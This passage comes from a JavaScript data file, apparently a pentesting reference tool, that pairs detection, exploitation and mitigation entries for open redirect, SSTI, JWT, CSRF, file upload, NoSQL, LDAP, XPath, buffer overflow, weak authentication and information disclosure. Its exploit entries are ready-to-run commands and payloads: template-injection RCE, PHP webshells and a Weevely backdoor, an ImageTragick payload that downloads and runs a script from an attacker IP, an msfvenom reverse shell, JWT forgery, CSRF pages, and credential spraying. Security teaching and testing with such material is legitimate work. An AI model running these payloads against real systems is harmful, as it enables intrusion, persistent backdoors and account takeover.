      { t: 'qsreplace + gau',         b: 'Find historically used redirect params via Archive.', cmd: `gau [TARGET_HOST] | grep -E "next=|redirect=|url=|to=" | qsreplace "https://evil.com" | while read u; do curl -Is "$u"|grep -i "^location: https://evil.com"; done` },
      { t: 'Bypass (//) Technique',   b: 'Try protocol-relative URL to bypass hostname checks.', cmd: `curl -I "[TARGET_URL]?next=//evil.com"` },
    ],
    exploit: [
      { t: 'Phishing via Redirect',   b: 'Craft a link from a trusted domain that redirects to a phishing page.', cmd: `https://[TRUSTED_TARGET_HOST]/redirect?url=https://phishing.attacker.io/login` },
      { t: 'OAuth Token Theft',       b: 'If redirect_uri is validated loosely, steal OAuth tokens.', cmd: `https://auth.example.com/oauth/authorize?client_id=APP&redirect_uri=https://[TARGET_HOST]/callback%2f..%2f..%2fattacker.com` },
      { t: 'SSRF via Redirect',       b: 'Chain open redirect with SSRF — some SSRF filters follow redirects.' },
    ],
    mitigate: [
      { t: 'Allowlist Redirect URLs', b: 'Only permit redirects to an explicit allowlist of trusted domains.' },
      { t: 'Relative URLs Only',      b: 'Accept only relative paths (starting with /) for redirect targets.' },
      { t: 'Validate redirect_uri',   b: 'For OAuth, perform exact string match (not prefix) on redirect_uri.' },
      { t: 'Warn Users',              b: 'Show an intermediate "you are leaving this site" warning page before external redirects.' },
    ],
    resources: ['https://portswigger.net/web-security/dom-based/open-redirection','https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html','https://book.hacktricks.xyz/pentesting-web/redirects'],
  },

  // ── GENERIC FALLBACK ─────────────────────────────
  generic: {
    name: 'General Vulnerability',
    detect: [
      { t: 'Exploit-DB Search',       b: 'Find known PoC exploit code.', cmd: 'searchsploit CVE_ID\n# https://www.exploit-db.com/search?cve=CVE_ID' },
      { t: 'GitHub PoC Search',       b: 'Find public PoC repos on GitHub.', cmd: '# https://github.com/search?q=CVE_ID&type=repositories' },
      { t: 'nuclei CVE Scan',         b: 'Run nuclei with CVE-specific templates.', cmd: 'nuclei -u [TARGET_URL] -t cves/ -id CVE_ID' },
      { t: 'Nmap Version Scan',       b: 'Confirm the vulnerable service version.', cmd: 'nmap -sV --version-intensity 9 -p- -T4 [TARGET_HOST]' },
      { t: 'Shodan Recon',            b: 'Find internet-exposed instances.', cmd: 'shodan search "product:[PRODUCT] version:[VERSION] vuln:CVE_ID"' },
      { t: 'Censys Recon',            b: 'Alternative to Shodan for asset discovery.', cmd: 'censys search "services.software.version:[VERSION]"' },
    ],
    exploit: [
      { t: 'Find & Study PoC Code',   b: 'Locate and study public PoC before lab reproduction.', cmd: `# Research:\n# https://github.com/search?q=CVE_ID\n# https://packetstormsecurity.com/?q=CVE_ID\n# https://www.exploit-db.com/search?cve=CVE_ID` },
      { t: 'Metasploit Module',       b: 'Check for an existing Metasploit module.', cmd: 'msfconsole -q -x "search CVE_ID; exit"' },
      { t: 'nuclei Template Run',     b: 'Execute if a nuclei template exists.', cmd: 'nuclei -u [TARGET_URL] -t cves/[YEAR]/CVE_ID.yaml -v' },
      { t: 'Isolated Lab Reproduction', b: 'Build vulnerable Docker/VM environment to reproduce safely.', cmd: 'docker run --rm -d -p 8080:80 vulhub/[APP]:vulnerable' },
    ],
    mitigate: [
      { t: 'Apply Vendor Patch',      b: 'Install security patches immediately. Subscribe to vendor advisories.' },
      { t: 'Compensating Controls',   b: 'Disable the affected feature, add ACLs, or deploy WAF rules until a patch is available.' },
      { t: 'CISA KEV Catalog',        b: 'Check for active exploitation notice.', cmd: '# https://www.cisa.gov/known-exploited-vulnerabilities-catalog' },
      { t: 'Network Segmentation',    b: 'Isolate vulnerable systems from Internet and sensitive internal segments.' },
      { t: 'Threat Hunting',          b: 'Use SIEM/EDR to hunt for IOCs associated with this CVE.', cmd: 'grep -i "CVE_ID" /var/log/auth.log /var/log/syslog /var/log/apache2/*.log' },
    ],
    resources: ['https://nvd.nist.gov/vuln/detail/CVE_ID','https://www.cisa.gov/known-exploited-vulnerabilities-catalog','https://www.exploit-db.com','https://packetstormsecurity.com','https://github.com/projectdiscovery/nuclei-templates','https://book.hacktricks.xyz/'],
  },

  // ── SSTI ──────────────────────────────────────────
  ssti: {
    name: 'Server-Side Template Injection (SSTI)',
    detect: [
      { t: 'Polyglot Probe',          b: 'Inject the universal SSTI polyglot to trigger errors across Jinja2/Twig/Freemarker.',
        cmd: `curl -s "[TARGET_URL]?name={{7*7}}" | grep 49\ncurl -s "[TARGET_URL]?name=\${7*7}" | grep 49\ncurl -s "[TARGET_URL]?name=<%= 7*7 %>" | grep 49` },
      { t: 'tplmap Scanner',          b: 'Automated SSTI detection and exploitation (like sqlmap for templates).', cmd: 'python3 tplmap.py -u "[TARGET_URL]?name=INJECT" --engine Jinja2' },
      { t: 'Engine Fingerprinting',   b: 'Use engine-specific math expressions to identify the template engine.', cmd: `# Jinja2/Twig: {{7*7}} → 49\n# Freemarker: \${7*7} → 49\n# Smarty: {7*7} → 49\n# Mako: \${7*7} → 49\n# Tornado: {{ 7*7 }} → 49` },
      { t: 'Error Message Analysis',  b: 'Send malformed template syntax and read the error for engine version info.', cmd: 'curl -s "[TARGET_URL]?name={{" | grep -iE "jinja|flask|django|twig|freemarker"' },
      { t: 'Burp Suite Active Scan',  b: 'Run Burp Pro Active Scanner; it includes SSTI detection payloads.' },
    ],
    exploit: [
      { t: 'Jinja2 RCE (Python)',     b: 'Jinja2 sandbox escape to execute OS commands (authorized lab only).', cmd: `# Via __class__ chain:\ncurl -s "[TARGET_URL]?name={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"` },
      { t: 'Jinja2 Config Dump',      b: 'Dump Flask/Django secret key from config object.', cmd: `curl -s "[TARGET_URL]?name={{config}}"` },
      { t: 'Twig RCE (PHP)',          b: 'Twig template RCE payload.', cmd: `curl -s "[TARGET_URL]?name={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"` },
      { t: 'Freemarker RCE (Java)',   b: 'Freemarker arbitrary code execution.', cmd: `curl -s "[TARGET_URL]?name=<#assign ex='freemarker.template.utility.Execute'?new()>\${ex('id')}"` },
      { t: 'tplmap Auto Exploit',     b: 'Use tplmap to automatically exploit SSTI and get a shell.', cmd: 'python3 tplmap.py -u "[TARGET_URL]?name=INJECT" --os-shell' },
    ],
    mitigate: [
      { t: 'Sandbox Template Engine', b: 'Use sandboxed template environments that disable access to dangerous objects.' },
      { t: 'Never Render User Input', b: 'Never pass user-controlled strings directly to template render() calls. Treat user input as data, not template code.' },
      { t: 'Allowlist Template Variables', b: 'Pass only pre-defined safe variables into templates. Never concatenate user input.' },
      { t: 'Use Logic-less Templates', b: 'Switch to logic-less template engines (Mustache, Handlebars) which have no code execution primitives.' },
      { t: 'Update Template Engine', b: 'Keep Jinja2, Twig, Freemarker, and similar libraries up to date for sandbox escape patches.' },
    ],
    resources: [
      'https://portswigger.net/web-security/server-side-template-injection',
      'https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection',
      'https://github.com/epinna/tplmap',
      'https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti',
    ],
  },

  // ── JWT ───────────────────────────────────────────
  jwt: {
    name: 'JWT Vulnerabilities',
    detect: [
      { t: 'Decode & Inspect JWT',    b: 'Decode the JWT without verification to inspect claims and algorithm.', cmd: `# Manual base64 decode:\necho "[JWT_HEADER]" | base64 -d\necho "[JWT_PAYLOAD]" | base64 -d\n# Or use jwt_tool:\npython3 jwt_tool.py [JWT_TOKEN]` },
      { t: 'Check Algorithm: none',   b: 'Test if the server accepts unsigned JWTs (alg:none attack).', cmd: `python3 jwt_tool.py [JWT_TOKEN] -X a` },
      { t: 'Check Expired Tokens',    b: 'Re-send a captured expired JWT and check if it is still accepted.', cmd: `python3 jwt_tool.py [JWT_TOKEN] -R\n# -R flag reads and displays exp claim in local time` },
      { t: 'Brute-Force HS256 Secret', b: 'Crack the HMAC secret offline with hashcat or jwt_tool.', cmd: `# hashcat (GPU):\nhashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt\n# jwt_tool (CPU):\npython3 jwt_tool.py [JWT_TOKEN] -C -d wordlist.txt` },
      { t: 'Burp JWT Editor',         b: 'Use Burp Suite JWT Editor extension to decode, tamper, and re-sign tokens in Repeater.' },
    ],
    exploit: [
      { t: 'Algorithm Confusion (none)', b: "Set alg to 'none' and remove the signature to forge arbitrary claims.", cmd: `python3 jwt_tool.py [JWT_TOKEN] -X a\n# Submit modified token; if server accepts it, claims are fully forgeable` },
      { t: 'RS256 → HS256 Confusion', b: 'If server uses RS256, switch to HS256 signing with the public key as the HMAC secret.', cmd: `python3 jwt_tool.py [JWT_TOKEN] -X k -pk public.pem` },
      { t: 'Forge Admin Claims',      b: 'After recovering the secret or exploiting alg confusion, mint a token with elevated roles.', cmd: `python3 jwt_tool.py [JWT_TOKEN] -T\n# Then modify "role":"admin" or "isAdmin":true in the payload` },
      { t: 'JWKS Spoofing (jku)',     b: 'Inject a jku header pointing to an attacker-controlled JWKS endpoint.', cmd: `python3 jwt_tool.py [JWT_TOKEN] -X s\n# Hosts a malicious JWKS; signs token with attacker key` },
      { t: 'kid Parameter Injection', b: 'If the kid claim maps to a DB or file, inject SQL or path traversal.', cmd: `# kid SQLi payload:\npython3 jwt_tool.py [JWT_TOKEN] -I -hc kid -hv "' UNION SELECT 'ATTACKER_SECRET'-- -"` },
    ],
    mitigate: [
      { t: 'Enforce Strict Algorithm', b: 'Hardcode the expected algorithm server-side. Never read the algorithm from the token itself.', cmd: `# Node.js example:\njwt.verify(token, secret, { algorithms: ['HS256'] })` },
      { t: 'Reject alg:none',         b: 'Explicitly reject unsigned tokens in your JWT library configuration.' },
      { t: 'Short Expiry + Rotation', b: 'Set exp to ≤ 15 minutes for sensitive operations. Use refresh tokens for longer sessions.' },
      { t: 'Validate All Claims',     b: 'Verify iss, aud, exp, nbf on every request. Do not skip validation for internal services.' },
      { t: 'Store Secrets Securely',  b: 'Use secrets > 256 bits from an HSM or secrets manager. Never hardcode JWT secrets in source code.' },
    ],
    resources: [
      'https://portswigger.net/web-security/jwt',
      'https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens',
      'https://github.com/ticarpi/jwt_tool',
      'https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens/critical-vulnerabilities-in-json-web-token-signing-algorithms',
    ],
  },

  // ── CSRF ──────────────────────────────────────────
  csrf: {
    name: 'Cross-Site Request Forgery (CSRF)',
    detect: [
      { t: 'Check CSRF Token Presence', b: 'Inspect state-changing requests (POST/PUT/DELETE) for CSRF tokens in forms and headers.', cmd: `# Inspect with curl:\ncurl -c cookies.txt -b cookies.txt -s "[TARGET_URL]/dashboard" | grep -i "csrf\\|_token\\|nonce"` },
      { t: 'Remove CSRF Token',       b: "Delete the CSRF token from a POST request and check if the server still processes it.", cmd: `curl -b "session=[COOKIE]" -X POST "[TARGET_URL]/change-email" -d "email=attacker@evil.com"` },
      { t: 'Swap to GET Method',      b: "Change POST to GET with query params — some servers validate CSRF only on POST.", cmd: `curl -b "session=[COOKIE]" "[TARGET_URL]/change-email?email=attacker@evil.com"` },
      { t: 'Change Content-Type',     b: "Switch Content-Type to text/plain — may bypass CSRF token validation for JSON endpoints.", cmd: `curl -b "session=[COOKIE]" -X POST -H "Content-Type: text/plain" -d '{"email":"attacker@evil.com"}' [TARGET_URL]/api/settings` },
      { t: 'Burp CSRF PoC Generator', b: 'Right-click any state-changing request in Burp → Engagement Tools → Generate CSRF PoC.' },
    ],
    exploit: [
      { t: 'HTML Form Auto-Submit',   b: 'Host a malicious page that auto-submits a form on load (victim must be logged in).', cmd: `<!-- Save as csrf.html and host on attacker server -->\n<html><body onload="document.forms[0].submit()">\n<form action="https://[TARGET_URL]/change-email" method="POST">\n  <input name="email" value="attacker@evil.com">\n</form></body></html>` },
      { t: 'GET-Based CSRF via img',  b: 'Trigger a GET-based CSRF with an img tag embed.', cmd: `<img src="https://[TARGET_URL]/delete-account?confirm=true" width=0 height=0>` },
      { t: 'JSON CSRF via fetch',     b: 'If no SameSite cookies and CORS is misconfigured, use fetch() to submit JSON.', cmd: `<script>\nfetch('https://[TARGET_URL]/api/transfer', {\n  method: 'POST',\n  credentials: 'include',\n  headers: {'Content-Type': 'application/json'},\n  body: JSON.stringify({amount: 1000, to: 'attacker'})\n});\n</script>` },
      { t: 'Token Leak via Referrer', b: 'If CSRF token appears in URL, it leaks via Referer header to third-party sites.' },
    ],
    mitigate: [
      { t: 'SameSite Cookie Attribute', b: 'Set SameSite=Strict or SameSite=Lax on all session cookies.', cmd: 'Set-Cookie: session=TOKEN; SameSite=Strict; Secure; HttpOnly' },
      { t: 'Synchronizer Token Pattern', b: 'Generate a unique, unpredictable CSRF token per session. Validate on every state-changing request.' },
      { t: 'Double Submit Cookie',    b: 'Set a random value in both a cookie and a request parameter; verify they match server-side.' },
      { t: 'Verify Origin/Referer',   b: 'Reject requests where Origin/Referer does not match the expected domain.' },
      { t: 'Custom Request Headers', b: 'Require a custom header (e.g., X-Requested-With: XMLHttpRequest) for AJAX endpoints — browsers block cross-origin custom headers.' },
    ],
    resources: [
      'https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery',
      'https://portswigger.net/web-security/csrf',
      'https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html',
    ],
  },

  // ── FILE UPLOAD ───────────────────────────────────
  fileupload: {
    name: 'Malicious File Upload',
    detect: [
      { t: 'Upload PHP Webshell',     b: 'Try uploading a .php file and access it directly.', cmd: `# Create minimal PHP shell:\necho '<?php system($_GET["c"]); ?>' > shell.php\ncurl -F "file=@shell.php" "[TARGET_URL]/upload"\ncurl "[TARGET_URL]/uploads/shell.php?c=id"` },
      { t: 'Extension Bypass Test',   b: 'Try double extensions and mixed case to bypass blacklists.', cmd: `# Try variations:\nfor ext in .php .php5 .phtml .pHp .PHP .php.jpg .php%00.jpg; do\n  cp shell.php "shell$ext"\n  curl -F "file=@shell$ext" "[TARGET_URL]/upload"\ndone` },
      { t: 'MIME Type Inspection',    b: 'Check if Content-Type validation can be bypassed.', cmd: `curl -F "file=@shell.php;type=image/jpeg" "[TARGET_URL]/upload"` },
      { t: 'Magic Bytes Bypass',      b: 'Prepend GIF89a; magic bytes to a PHP shell to bypass file signature checks.', cmd: `# Create polyglot PHP/GIF:\nprintf 'GIF89a;<?php system($_GET["c"]); ?>' > polyglot.php.gif\ncurl -F "file=@polyglot.php.gif" "[TARGET_URL]/upload"` },
      { t: 'Burp Upload Fuzzer',      b: 'Use Burp Intruder with a list of dangerous extensions/MIME types to fuzz the upload endpoint.' },
    ],
    exploit: [
      { t: 'PHP Webshell RCE',        b: 'Upload and execute a PHP webshell to run arbitrary OS commands.', cmd: `echo '<?php system($_GET["c"]); ?>' > shell.php\ncurl -F "file=@shell.php" "[TARGET_URL]/upload"\ncurl "[TARGET_URL]/uploads/shell.php?c=whoami"` },
      { t: 'Weevely Backdoor',        b: 'Generate a stealthy PHP backdoor with Weevely.', cmd: `weevely generate [PASSWORD] shell.php\ncurl -F "file=@shell.php" "[TARGET_URL]/upload"\nweevely [TARGET_URL]/uploads/shell.php [PASSWORD]` },
      { t: 'ImageTragick (CVE-2016-3714)', b: 'Exploit ImageMagick via a malicious image file uploaded to any endpoint that processes images.', cmd: `# Create exploit file:\ncat > exploit.mvg << 'EOF'\npush graphic-context\nviewbox 0 0 640 480\nfill 'url(https://127.0.0.1/x";curl http://[ATTACKER_IP]/pwned -o /tmp/p;sh /tmp/p;")'  \nEOF\ncurl -F "file=@exploit.mvg" [TARGET_URL]/upload` },
      { t: 'SVG XSS via Upload',      b: 'Upload a malicious SVG that executes JavaScript when rendered.', cmd: `printf '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>' > xss.svg\ncurl -F "file=@xss.svg;type=image/svg+xml" "[TARGET_URL]/upload"` },
      { t: 'ZIP Symlink Attack',       b: 'Upload a ZIP containing symlinks to traverse the filesystem (when auto-extracted).', cmd: `# Create symlink-based zip:\nln -s /etc/passwd passwd_link\nzip --symlinks exploit.zip passwd_link\ncurl -F "file=@exploit.zip" "[TARGET_URL]/upload"` },
    ],
    mitigate: [
      { t: 'Allowlist Extensions',    b: 'Strictly allowlist only safe file types (png, jpg, pdf). Reject everything else.' },
      { t: 'Validate Magic Bytes',    b: 'Check file content magic bytes server-side, not just extension or Content-Type.' },
      { t: 'Store Outside Web Root',  b: 'Store uploads in a non-web-accessible directory. Serve via a download endpoint, never directly.' },
      { t: 'Rename Uploaded Files',   b: 'Rename files to a UUID on upload to prevent direct execution by filename.' },
      { t: 'Disable Execution in Upload Dir', b: 'Configure web server to disable script execution in upload directories.', cmd: `# Apache:\n<Directory /var/www/uploads>\n  php_flag engine off\n  Options -ExecCGI\n</Directory>\n# Nginx: location /uploads { location ~ \\.php$ { deny all; } }` },
      { t: 'Scan Uploads with AV',    b: 'Run uploaded files through ClamAV or a cloud virus scanner before storing.' },
    ],
    resources: [
      'https://portswigger.net/web-security/file-upload',
      'https://book.hacktricks.xyz/pentesting-web/file-upload/index.html',
      'https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload',
      'https://book.hacktricks.xyz/pentesting-web/file-upload/polyglot-files',
      'https://book.hacktricks.xyz/pentesting-web/file-upload/images-and-pdf-upload',
    ],
  },

  // ── NoSQL INJECTION ───────────────────────────────
  nosqli: {
    name: 'NoSQL Injection',
    detect: [
      { t: 'Operator Injection',      b: "Inject $ne, $gt, $where operators into JSON or URL params.", cmd: `curl -s "[TARGET_URL]/api/login" -H "Content-Type: application/json" -d '{"user":"admin","pass":{"$ne":""}}'` },
      { t: '$where RCE Probe',       b: 'Test $where with a sleep to detect Mongo execution.', cmd: `curl -s "[TARGET_URL]/api/search" -H "Content-Type: application/json" -d '{"$where":"sleep(4000)"}' -o /dev/null -w "%{time_total}\\n"` },
      { t: 'URL-Encoded Operator',   b: 'URL-encode $ symbols for GET-based NoSQL injection.', cmd: `curl -s "[TARGET_URL]/users?role=%24ne"` },
      { t: 'NoSQLMap Tool',          b: 'Automated NoSQL injection scanner.', cmd: 'nosqlmap.py --url "[TARGET_URL]/api/login" --method POST' },
      { t: 'Burp Extension',         b: 'Use the NoSQL injection Burp extension for automated in-scope testing.' },
    ],
    exploit: [
      { t: 'Auth Bypass ($ne)',      b: 'Bypass login by making the password condition false.', cmd: `curl -s "[TARGET_URL]/api/login" -H "Content-Type: application/json" -d '{"user":"admin","pass":{"$ne":""}}'` },
      { t: 'Data Exfil ($regex)',    b: 'Extract data field-by-field using regex brute force.', cmd: `curl -s "[TARGET_URL]/api/users?search={\\"name\\":{\\"$regex\\":\\"^a\\"}}"` },
      { t: '$where JS Injection',    b: 'If $where is enabled, run JavaScript server-side (Mongo).', cmd: `curl -s "[TARGET_URL]/api/search" -H "Content-Type: application/json" -d '{"$where":"this.role == \\"admin\\" || true"}'` },
      { t: 'Blind Boolean',          b: 'Infer data via true/false responses on $regex.', cmd: `curl -s -o /dev/null -w "%{http_code}" "[TARGET_URL]/search?x[regex]=^A"` },
    ],
    mitigate: [
      { t: 'Sanitize Operators',     b: 'Strip MongoDB/LDAP operators ($, {, }) from user input before queries.' },
      { t: 'Use ORM/ODM Mapper',     b: 'Use Mongoose-style mappers that whitelist query fields and types.' },
      { t: 'Validate Types',         b: 'Enforce input types (strings not objects) via schema validation.' },
      { t: 'Least-Privilege DB',     b: 'Run queries with a role that cannot issue $where (that requires full JS on the server).' },
    ],
    resources: [
      'https://book.hacktricks.xyz/pentesting-web/nosql-injection',
      'https://portswigger.net/web-security/nosql-injection',
      'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection',
      'https://github.com/codingo/NoSQLMap',
    ],
  },

  // ── LDAP INJECTION ────────────────────────────────
  ldapi: {
    name: 'LDAP Injection',
    detect: [
      { t: 'Filter Injection Probe', b: 'Inject * and ) operators into LDAP-backed login params.', cmd: `curl -s "[TARGET_URL]/login?user=*)(uid=*))(|(uid=*&pass=*"` },
      { t: 'Boolean Blind',          b: 'Test AND/OR boolean conditions against the LDAP filter.', cmd: `curl -s "[TARGET_URL]/search?user=a)(&)(|(uid=a"` },
      { t: 'Error-Based',            b: 'Send malformed filters to trigger LDAP error messages.', cmd: `curl -s "[TARGET_URL]/login?user=admin)(&"` },
      { t: 'ldapsearch Local Test',  b: 'Validate payloads against a local OpenLDAP instance.', cmd: 'ldapsearch -x -b "dc=example,dc=com" "(uid=*)(|(uid=a)"' },
    ],
    exploit: [
      { t: 'Auth Bypass',            b: 'Craft filter to always evaluate true.', cmd: `curl -s "[TARGET_URL]/login?user=admin)(|(uid=*&pass="` },
      { t: 'Wildcard Enumeration',   b: 'Discover DNs / attributes via wildcard queries.', cmd: `curl -s "[TARGET_URL]/search?user=*&attr=cn"` },
      { t: 'Blind Attribute Extraction', b: 'Brute-force attribute values character-by-character.', cmd: `# Try: user=a* then ab*, abc* ... until bind succeeds` },
    ],
    mitigate: [
      { t: 'Escape LDAP Metachars',  b: 'Escape * ( ) \\ / and NUL before building filters.' },
      { t: 'Use Parameterized Filters', b: 'Use frameworks that bind search parameters safely (e.g., Spring LDAP).' },
      { t: 'Validate Input',         b: 'Restrict usernames to safe charset (alphanumeric).' },
      { t: 'Least-Privilege Bind',   b: 'Bind with the minimum privilege needed for the search.' },
    ],
    resources: [
      'https://book.hacktricks.xyz/pentesting-web/ldap-injection',
      'https://owasp.org/www-community/attacks/LDAP_Injection',
      'https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html',
    ],
  },

  // ── XPATH INJECTION ───────────────────────────────
  xpath: {
    name: 'XPath Injection',
    detect: [
      { t: 'Boolean XPath Probe',    b: 'Inject Boolean conditions into XML query params.', cmd: `curl -s "[TARGET_URL]/api?filter=1 or 1=1"` },
      { t: 'Count Function',         b: 'Use count() to enumerate nodes.', cmd: `curl -s "[TARGET_URL]/api?filter=count(//user)=1"` },
      { t: 'Error/Content Diff',     b: 'Compare responses for true vs false expressions.' },
      { t: 'xpathTool',              b: 'Automated XPath injection tool.', cmd: 'python3 xpathtool.py "[TARGET_URL]/api?user=INJECT" -t count(//user)' },
    ],
    exploit: [
      { t: 'Extract Users',          b: 'Concatenate node values to dump credentials.', cmd: `curl -s "[TARGET_URL]/api?user=a or 1=1"` },
      { t: 'Blind Char Brute',       b: 'Extract password chars via substring() + boolean.', cmd: `curl -s "[TARGET_URL]/api?user=a or substring(//user[1]/pass,1,1)=\\'A\\'"` },
    ],
    mitigate: [
      { t: 'Parameterize Queries',   b: 'Never concatenate user input into XPath expressions.' },
      { t: 'Validate Input',         b: 'Reject filter strings containing quotes, /, or function calls unless intended.' },
      { t: 'Avoid XPath for Queries', b: 'Parse XML into an object model and query in code, not via raw XPath from user input.' },
    ],
    resources: [
      'https://owasp.org/www-community/attacks/XPATH_Injection',
      'https://book.hacktricks.xyz/pentesting-web/ldap-injection',
    ],
  },

  // ── BUFFER OVERFLOW ────────────────────────────────
  bufferoverflow: {
    name: 'Buffer Overflow',
    detect: [
      { t: 'Crash Fuzzing',          b: 'Send long strings to find a crash/offset.', cmd: `#!/bin/bash\nfor i in $(seq 100 100 2400); do /opt/vulnbin $(python3 -c "print('A'*$i)") 2>/dev/null || echo " CRASH at $i"; done` },
      { t: 'Pattern Offset (MSF)',   b: 'Find exact EIP offset with metasploit cyclic pattern.', cmd: `msf-pattern_create -l 2400\n# Crash, then:\nmsf-pattern_offset -q <EIP_VALUE>` },
      { t: 'gdb Disassembly',        b: 'Analyze the binary in gdb to locate the vulnerable function.', cmd: 'gdb -q ./vulnbin\n(info functions)\n(disassemble main)' },
      { t: 'radare2 / Ghidra',       b: 'Open the binary statically to find strcpy/gets/sprintf usage.', cmd: 'r2 -A ./vulnbin' },
    ],
    exploit: [
      { t: 'EIP Control',            b: 'Confirm you control EIP/RIP with a pattern offset.', cmd: `python3 -c "import sys; sys.stdout.buffer.write(b'A'*OFFSET + b'BBBB')" > payload\n./vulnbin < payload` },
      { t: 'Bad Character Discovery', b: 'Send all 256 bytes to identify badchars.', cmd: `\\x01\\x02...\\xff # remove \\x00\\x0a\\x0d etc. after detecting` },
      { t: 'JMP ESP (ret2reg)',      b: 'Redirect execution to your shellcode via JMP/CALL ESP gadget.', cmd: `msf-nasm_shell\n# find gadget with ROPgadget or mona:\n!mona jmp -r esp` },
      { t: 'msfvenom Shellcode',     b: 'Generate OS-appropriate shellcode minus badchars.', cmd: `msfvenom -p windows/shell_reverse_tcp LHOST=[ATTACKER_IP] LPORT=4444 -f python -b "\\x00\\x0a\\x0d"` },
      { t: 'Exploit in Immutable Debugger', b: 'Step execution to verify shellcode lands in memory.', cmd: '# Immunity Debugger: set breakpoint at JMP ESP, send payload, verify' },
    ],
    mitigate: [
      { t: 'Compile with Protections', b: 'Use ASLR/DEP/NX-stack and stack canaries.', cmd: 'gcc -fstack-protector-all -pie -fPIE -Wl,-z,relro,-z,now app.c -o app' },
      { t: 'Safe String Functions',   b: 'Use strncpy/snprintf/memcpy_s with explicit lengths.' },
      { t: 'Bounds Checking',         b: 'Validate length before copying; use checked arrays in managed languages.' },
      { t: 'Control-Flow Integrity',  b: 'Enable CFG / CET shadow stacks on supported platforms.' },
      { t: 'ASLR + DEP',              b: 'Randomize addresses and mark memory non-executable.', cmd: '# Windows: EMET or Default flags; Linux: kernel.kptr_restrict + PIE builds' },
    ],
    resources: [
      'https://book.hacktricks.xyz/exploit-hardening/pentesting-methodology/bufbof-example',
      'https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/',
      'https://owasp.org/www-community/vulnerabilities/Buffer_Overflow',
    ],
  },

  // ── WEAK AUTHENTICATION ────────────────────────────
  weakauth: {
    name: 'Weak Authentication / Default Credentials',
    detect: [
      { t: 'Default Credential Check', b: 'Try common default vendor pairs on login.', cmd: `curl -s -X POST "[TARGET_URL]/login" -d "user=admin&pass=admin"\ncurl -s -X POST "[TARGET_URL]/login" -d "user=admin&pass=password"\ncurl -s -X POST "[TARGET_URL]/login" -d "user=root&pass=toor"` },
      { t: 'nuclei Default-Creds',   b: 'Run nuclei default-login templates.', cmd: 'nuclei -u [TARGET_URL] -t http/default-logins/ -v' },
      { t: 'hydra Bruteforce',       b: 'Brute-force a login with a username/password list.', cmd: 'hydra -L users.txt -P pass.txt [TARGET_HOST] http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"' },
      { t: 'Enumeration',            b: 'Check for user enumeration via timing/error differences.', cmd: 'curl -s -X POST [TARGET_URL]/login -d "user=admin&pass=wrong"' },
      { t: 'Credential Stuffing',    b: 'Test leaked credential lists against the endpoint (authorized testing only).', cmd: 'hydra -C leaked-combos.txt [TARGET_HOST] http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"' },
    ],
    exploit: [
      { t: 'Default Admin Access',   b: 'Authenticate with a known default credential.', cmd: 'curl -s -X POST "[TARGET_URL]/login" -d "user=admin&pass=admin" -c cookies.txt' },
      { t: 'Password Spraying',      b: 'Try a small common set of passwords across many usernames.', cmd: 'hydra -L users.txt -p Password123! [TARGET_HOST] http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"' },
      { t: 'Session After Reset',    b: 'Check if password reset allows guessable temporary passwords.' },
    ],
    mitigate: [
      { t: 'Enforce Strong Policy',  b: 'Length + complexity + common-password blocklists.' },
      { t: 'MFA / TOTP',             b: 'Require multi-factor authentication for all accounts, especially admin.' },
      { t: 'Account Lockout',        b: 'Lock after N failures; add progressive delays.' },
      { t: 'Ban Defaults',           b: 'Force password change on first login; disable default vendor credentials.' },
      { t: 'Breach Check',           b: 'Hash and check credentials against HaveIBeenPwned on registration.' },
    ],
    resources: [
      'https://book.hacktricks.xyz/pentesting-web/login-bypass',
      'https://owasp.org/www-community/vulnerabilities/Weak_Authentication',
      'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/01-Testing_for_Weak_Password_Policy',
    ],
  },

  // ── INFORMATION DISCLOSURE ─────────────────────────
  infodisc: {
    name: 'Information Disclosure',
    detect: [
      { t: 'Sensitive Path Check',   b: 'Probe common sensitive files.', cmd: `for p in .git/config .env server-status wp-config.php backup.sql config.php.bak /actuator/env /api/swagger.json; do\n  code=$(curl -s -o /dev/null -w "%{http_code}" "[TARGET_URL]/$p"); echo "$code  $p";\ndone` },
      { t: 'Directory Enumeration',  b: 'Fuzz for hidden directories/backup files.', cmd: 'ffuf -u "[TARGET_URL]/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,204,301,302 -ac' },
      { t: 'Error Leak Test',        b: 'Trigger errors to check for stack traces/config leaks.', cmd: 'curl -s "[TARGET_URL]/?id[]=1" | grep -iE "stack|trace|debug|sqlstate|exception"' },
      { t: 'Techno Fingerprint',     b: 'Detect server/framework versions from headers.', cmd: 'curl -sI [TARGET_URL] | grep -iE "server|x-powered-by|set-cookie|deprecated"' },
      { t: 'Hidden Endpoint Fuzz',   b: 'Find dev/staging endpoints (api, swagger, backup).', cmd: 'ffuf -u "[TARGET_URL]/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200' },
    ],
    exploit: [
      { t: 'Git Source Leak',        b: 'Download .git to reconstruct source code.', cmd: `git clone --mirror [TARGET_URL]/.git leaked.git` },
